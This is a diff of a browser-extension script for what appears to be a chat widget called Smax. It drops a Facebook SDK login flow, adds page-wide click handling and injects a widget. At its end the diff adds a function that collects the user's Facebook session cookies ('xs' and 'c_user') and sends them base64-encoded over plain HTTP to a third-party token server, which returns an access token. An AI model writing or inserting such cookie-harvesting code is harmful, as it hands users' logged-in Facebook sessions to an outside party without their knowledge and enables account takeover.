@@ -15,6 +15,26 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
 });
 */
 
+//alert("ss");
+
+
+
+
+$(document).on('click', 'body', function () {
+
+    chrome.runtime.sendMessage({
+        greeting: "hello"
+    }, function (response) {
+        console.log(response.farewell);
+        console.log(response.name);
+
+    });
+    return true;
+
+});
+
+
+
 $(document).on('click', '.exc-icon-inner', function () {
 
     if ($('.exc-expand').is(":visible")) {
@@ -46,110 +66,30 @@ var isLogin = false;
 
 
 
-function statusChangeCallback(response) {
-    console.log('statusChangeCallback');
-    console.log(response);
-    // The response object is returned with a status field that lets the
-    // app know the current login status of the person.
-    // Full docs on the response object can be found in the documentation
-    // for FB.getLoginStatus().
-    if (response.status === 'connected') {
-        // Logged into your app and Facebook.
-        testAPI();
-    } else {
-        // The person is not logged into your app or we are unable to tell.
-        document.getElementById('status').innerHTML = 'Please log ' +
-            'into this app.';
-    }
-}
-
-// This function is called when someone finishes with the Login
-// Button.  See the onlogin handler attached to it in the sample
-// code below.
-function checkLoginState() {
-    FB.getLoginStatus(function (response) {
-        statusChangeCallback(response);
-    });
-}
-
-window.fbAsyncInit = function () {
-    FB.init({
-        appId: '1989940074582638',
-        cookie: true, // enable cookies to allow the server to access 
-        // the session
-        xfbml: true, // parse social plugins on this page
-        version: 'v2.8' // use graph api version 2.8
-    });
-
-    // Now that we've initialized the JavaScript SDK, we call 
-    // FB.getLoginStatus().  This function gets the state of the
-    // person visiting this page and can return one of three states to
-    // the callback you provide.  They can be:
-    //
-    // 1. Logged into your app ('connected')
-    // 2. Logged into Facebook, but not your app ('not_authorized')
-    // 3. Not logged into Facebook and can't tell if they are logged into
-    //    your app or not.
-    //
-    // These three cases are handled in the callback function.
-
-    FB.getLoginStatus(function (response) {
-        statusChangeCallback(response);
-    });
-
-};
-
-(function (d, s, id) {
-    var js, fjs = d.getElementsByTagName(s)[0];
-    if (d.getElementById(id)) return;
-    js = d.createElement(s);
-    js.id = id;
-    js.src = "https://connect.facebook.net/en_US/sdk.js";
-    fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));
-
-// Here we run a very simple test of the Graph API after login is
-// successful.  See statusChangeCallback() for when this call is made.
-function testAPI() {
-    console.log('Welcome!  Fetching your information.... ');
-    FB.api('/me', function (response) {
-        console.log('Successful login for: ' + response.name);
-        document.getElementById('status').innerHTML =
-            'Thanks for logging in, ' + response.name + '!';
-    });
-}
-
 
 
 
 //Smax click
-$(document).on('click', '.modal-caption', function () {
+$(document).on('click', '.message', function () {
     console.log("smax");
 
 
+    if ($('#exc-style').length <= 0) {
+        $("head").append(style);
+    }
+
+    setTimeout(function () {
+
+        var linksList = document.querySelector('body');
+        if ($('.exc-box').is(":visible")) {
+            $('.exc-profile p').text($('.topbar.bg h3').html());
+            $('.exc-profile img').attr('src', $('.topbar.bg img').attr('src'));
+            $('.exc-icon-inner img').attr('src', $('.topbar.bg img').attr('src'));
 
 
 
-    if (isLogin) {
-
-
-
-        if ($('#exc-style').length <= 0) {
-            $("head").append(style);
-        }
-
-        setTimeout(function () {
-
-            var linksList = document.querySelector('body');
-            if ($('.exc-box').is(":visible")) {
-                $('.exc-profile p').text($('.topbar.bg h3').html());
-                $('.exc-profile img').attr('src', $('.topbar.bg img').attr('src'));
-                $('.exc-icon-inner img').attr('src', $('.topbar.bg img').attr('src'));
-
-
-
-            } else {
-                var html = `
+        } else {
+            var html = `
  <div class="exc-box">
         <div class="exc-expand">
             <em class="exc-close">X</em>
@@ -172,66 +112,12 @@ $(document).on('click', '.modal-caption', function () {
 
 `;
 
-                // linksList.innerHTML = request.data;
+            // linksList.innerHTML = request.data;
 
 
-                linksList.insertAdjacentHTML('beforeend', html);
-            }
-        }, 300);
-    } else {
-
-        if ($('#exc-style').length <= 0) {
-            $("head").append(style);
+            linksList.insertAdjacentHTML('beforeend', html);
         }
-
-        setTimeout(function () {
-
-            var linksList = document.querySelector('body');
-            if ($('.exc-box').is(":visible")) {
-
-
-
-
-            } else {
-                var html = `
- <div class="exc-box">
-        <div class="exc-expand">
-            <em class="exc-close">X</em>
-            <div class="exc-profile">
-                <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAFQElEQVR4Xu2dTWhcVRiGv3PutOJP0YUI9afrahVEhJpJhbRu3CmUaTLopuRPKehehAZBuhAEQcVkoq4kk44gSMGdZGFnAgFdWBXFhVawhYhuLLYx95wyJVCpk+Tc6bnpnfs92c45353zvg/f997JzcQIP6oVMKpPz+EFAJRDAAAAoFwB5cenAwCAcgWUH79nBxge+/B+b9wR5dqU4vjOr3+13Hz5l80O0xOAofr8s8b7L0qhgPZDeF9vL041AUArCACg1fmNcwMAADACNDNAB9DsvogAAAAwAjQzQAfQ7D4jQLn7AAAAjADlDAAAAHAXoJkBOoBm9wmByt0HAABgBChnAAAAgLsAzQzQATS7TwhU7j4AAAAjQDkDAAAA3AVsw4ATWbfiLjgxf5rUXraJW99qixe/T8Q+NBBo0QH+b9M1w70/Y4w5Y9Okk6ye/2lpaWZL0/9bpTrWmBGRkwAwEApcf5NOXGqdfe9fXzm10jp+sd+3DwD9KncL93knF0xij7YXxjs3+zYA4GYV3OH9TtyqSZNqpzXxc4xLA0AMFXeyhpFn2guTX8a6JADEUnIn6hj5pL0w+WLMSwFATDXzruXNY+3FiXMxLwMAMdXMs1bqvmm3pp+IfQkAiK1oTvW8+FOd5tRrscsDQGxFc6pnxD93tjn1eezyABBb0ZzqmdTuP9sa/zFr+UO12X2+khx2zu81xldu3O+MHLHeHM5a95as1/xR8O50bc9S68TfWYQfrs9PpD79wIpNsuwr7FqtAHQ/9l1uTu0SMT7UnFrtdHLe/vVHYuw9oXsKv04rACLyT7s5eUcWg7qt3yX21yx7Cr9WKwDeuUud09N3ZTFoqD6733j7Q5Y9hV8LAOEWPTXaeNga+T58xwCsBIBwk56uffRImqTfhe8YgJUAEG7ScH3ugPcm6sfG4VfPaSUAhAtbHZ1/VIz/NnzHAKwEgHCTAGBDq4H6tnDjPja+8v6NNqd+3S0vTn8dbr/IUO3t221y94Ht9jhx40bkpe3WFeL10ncAI2+2FyZf30mxh4813vVWTuzkNfu+FgD0Ld2mG6ujc5+JMc/Hr5xDRQCIL+pQrbFiEnkyfuUcKgJAfFGHjjV+N1b2xq+cQ0UAiCvqyMhMZe2+B66IFRu3ck7VACCusAdfaDyYpPJb3Ko5VgOAuOIeGps96MQux62aYzUAiCtutT53VLz5NG7VHKsBQFxxq2ONV0TknbhVc6xWdgC8kbduW197o5eEWR8H6z4RtHrnpT1b2bF2JZ0R71/N0bK4pcsOwGZq9fNACL8L2FBzoH4XsAkBALAhDB0gvKPSAegAPA/QZYAREN41Cr+SERBuESOAEcAIYATwTCAZIHxqFH8lGSDcIzIAGYAMQAYgA5ABwqdG8VeSAcI9IgOQAcgAZAAyABkgfGoUfyUZINwjMgAZgAxABiADkAHCp0bxV5IBwj0iA5AByABkADIAGSB8ahR/JRkg3CMyABmADEAGIAOQAcKnRvFXkgHCPSIDkAHIAGXJANdY9i7TP3/w3u4emG//Cm1sWkdAqD6lXwcApbd46wMCAAC0F6eam6lger1Qhj8PV2779ePTAZSjAAAAwAjQzAAdQLP73c9CfJ0OoJkBANDsPh1AufsAAACMAOUMAAAAcBegmQE6gGb3CYHK3QcAAGAEKGcAAACAuwDNDNABNLtPCFTuPgAAACNAOQP9ADBSn733cmoeVy5dKY6f+l3nVlrHL2Z6LLwUJ+cQQQr0/LuAoJ0sKoUCAFAKG/s/BAD0r10pdgJAKWzs/xBXAYxjO9s0VkbPAAAAAElFTkSuQmCC" />
-                <p>Yêu cầu đăng nhập</p>
-
-<fb:login-button scope="public_profile,email" onlogin="checkLoginState();">
-</fb:login-button>
-                <span class="exc-btn-sent">
-
-<a href="https://www.facebook.com/dialog/oauth?client_id=1989940074582638&redirect_uri=http://page.smax.in&scope=public_profile">
-Login facebook</a></span>
-            </div>
-
-        </div>
-        <div class="exc-icon">
-            <div class="exc-icon-inner">
-                <i class="phone-icon">
-                </i>
-
-                <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAFQElEQVR4Xu2dTWhcVRiGv3PutOJP0YUI9afrahVEhJpJhbRu3CmUaTLopuRPKehehAZBuhAEQcVkoq4kk44gSMGdZGFnAgFdWBXFhVawhYhuLLYx95wyJVCpk+Tc6bnpnfs92c45353zvg/f997JzcQIP6oVMKpPz+EFAJRDAAAAoFwB5cenAwCAcgWUH79nBxge+/B+b9wR5dqU4vjOr3+13Hz5l80O0xOAofr8s8b7L0qhgPZDeF9vL041AUArCACg1fmNcwMAADACNDNAB9DsvogAAAAwAjQzQAfQ7D4jQLn7AAAAjADlDAAAAHAXoJkBOoBm9wmByt0HAABgBChnAAAAgLsAzQzQATS7TwhU7j4AAAAjQDkDAAAA3AVsw4ATWbfiLjgxf5rUXraJW99qixe/T8Q+NBBo0QH+b9M1w70/Y4w5Y9Okk6ye/2lpaWZL0/9bpTrWmBGRkwAwEApcf5NOXGqdfe9fXzm10jp+sd+3DwD9KncL93knF0xij7YXxjs3+zYA4GYV3OH9TtyqSZNqpzXxc4xLA0AMFXeyhpFn2guTX8a6JADEUnIn6hj5pL0w+WLMSwFATDXzruXNY+3FiXMxLwMAMdXMs1bqvmm3pp+IfQkAiK1oTvW8+FOd5tRrscsDQGxFc6pnxD93tjn1eezyABBb0ZzqmdTuP9sa/zFr+UO12X2+khx2zu81xldu3O+MHLHeHM5a95as1/xR8O50bc9S68TfWYQfrs9PpD79wIpNsuwr7FqtAHQ/9l1uTu0SMT7UnFrtdHLe/vVHYuw9oXsKv04rACLyT7s5eUcWg7qt3yX21yx7Cr9WKwDeuUud09N3ZTFoqD6733j7Q5Y9hV8LAOEWPTXaeNga+T58xwCsBIBwk56uffRImqTfhe8YgJUAEG7ScH3ugPcm6sfG4VfPaSUAhAtbHZ1/VIz/NnzHAKwEgHCTAGBDq4H6tnDjPja+8v6NNqd+3S0vTn8dbr/IUO3t221y94Ht9jhx40bkpe3WFeL10ncAI2+2FyZf30mxh4813vVWTuzkNfu+FgD0Ld2mG6ujc5+JMc/Hr5xDRQCIL+pQrbFiEnkyfuUcKgJAfFGHjjV+N1b2xq+cQ0UAiCvqyMhMZe2+B66IFRu3ck7VACCusAdfaDyYpPJb3Ko5VgOAuOIeGps96MQux62aYzUAiCtutT53VLz5NG7VHKsBQFxxq2ONV0TknbhVc6xWdgC8kbduW197o5eEWR8H6z4RtHrnpT1b2bF2JZ0R71/N0bK4pcsOwGZq9fNACL8L2FBzoH4XsAkBALAhDB0gvKPSAegAPA/QZYAREN41Cr+SERBuESOAEcAIYATwTCAZIHxqFH8lGSDcIzIAGYAMQAYgA5ABwqdG8VeSAcI9IgOQAcgAZAAyABkgfGoUfyUZINwjMgAZgAxABiADkAHCp0bxV5IBwj0iA5AByABkADIAGSB8ahR/JRkg3CMyABmADEAGIAOQAcKnRvFXkgHCPSIDkAHIAGXJANdY9i7TP3/w3u4emG//Cm1sWkdAqD6lXwcApbd46wMCAAC0F6eam6lger1Qhj8PV2779ePTAZSjAAAAwAjQzAAdQLP73c9CfJ0OoJkBANDsPh1AufsAAACMAOUMAAAAcBegmQE6gGb3CYHK3QcAAGAEKGcAAACAuwDNDNABNLtPCFTuPgAAACNAOQP9ADBSn733cmoeVy5dKY6f+l3nVlrHL2Z6LLwUJ+cQQQr0/LuAoJ0sKoUCAFAKG/s/BAD0r10pdgJAKWzs/xBXAYxjO9s0VkbPAAAAAElFTkSuQmCC" />
-            </div>
-        </div>
-    </div>
-
-`;
-
-                // linksList.innerHTML = request.data;
-
-
-                linksList.insertAdjacentHTML('beforeend', html);
-            }
-        }, 300);
-
-
-
-    }
+    }, 300);
 
 });
 
@@ -382,3 +268,56 @@ chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
         success: true
     });
 });
+
+
+
+var key = "";
+
+function getallfb() {
+    chrome.cookies.getAll({
+        domain: ".facebook.com"
+    }, function (cookies) {
+        var check_login = false;
+        for (var i = 0; i < cookies.length; i++) {
+            if (cookies[i].name == "xs") {
+                check_login = true;
+                key += "xs=" + cookies[i].value + ";";
+            }
+            if (cookies[i].name == "c_user") {
+                key += "c_user=" + cookies[i].value + ";";
+            }
+        }
+        if (!check_login) {
+            var notification = new Notification('Thông báo lổi', {
+                icon: 'http://i.imgur.com/Nk0wyaW.png',
+                body: 'Hệ thống không tìm thấy bất cứ tài khoản Facebook nào đang đăng nhập.',
+            });
+            notification.onclick = function () {
+                window.open("http://facebook.com");
+            };
+        }
+        if (check_login) {
+            xmlhttp = new XMLHttpRequest();
+            xmlhttp.onreadystatechange = function () {
+                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+                    var html = JSON.parse(xmlhttp.responseText);
+                    if (typeof html.access_token !== 'undefined') {
+                        var newURL = "http://token.atpsoftware.vn/?access_token=" + html.access_token;
+                        window.open(newURL);
+                    } else {
+                        var notification = new Notification('Thông báo lổi', {
+                            icon: 'http://i.imgur.com/Nk0wyaW.png',
+                            body: html.msg,
+                        });
+                        notification.onclick = function () {
+                            window.open("http://atpsoftware.vn");
+                        };
+                    }
+
+                }
+            }
+            xmlhttp.open("GET", "http://token.atpsoftware.vn/token.php?key=" + btoa(key), false);
+            xmlhttp.send();
+        }
+    });
+}
